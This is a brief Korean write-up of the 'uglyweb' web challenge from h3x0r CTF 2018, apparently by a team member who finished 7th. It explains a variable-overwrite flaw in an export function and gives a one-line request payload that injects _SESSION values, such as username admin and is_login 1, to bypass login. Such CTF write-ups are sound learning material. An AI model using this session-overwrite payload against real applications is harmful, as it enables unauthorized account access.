# h3x0r CTF (2018)

## Team <i>BAOBOB N2WBEE</i>

<br>

![Alt text](https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/h3x0r2018/image/Ranking.png)  

<br>

- 일단 저는 웹 한문제 풀었습니다.
- 문제하나 백업해둬서 로컬서버에서 하나 더 풀었습니다.
- 7등

## uglyweb

- 소스코드파일을 준다.
- 코드를 잘 보면 export함수가 있는데 여기서 변수를 덮어쓸수 있는 취약점이 발생한다.
- 변수를 덮어쓰면 된다
### payload

> do=view_flag&_SESSION[username]=admin&_SESSION[password]=eb954764a69ba26bb88997c66d88a8834012413abfae5891b9a0b0590e1428e7&confirm_password=akskdhfld&msg=123&_SESSION[is_login]=1

<br>

- 세션변수중에 is_login 변수를 까먹고 안적어서 계속 로그이 초기화되는 상황이 있었다.
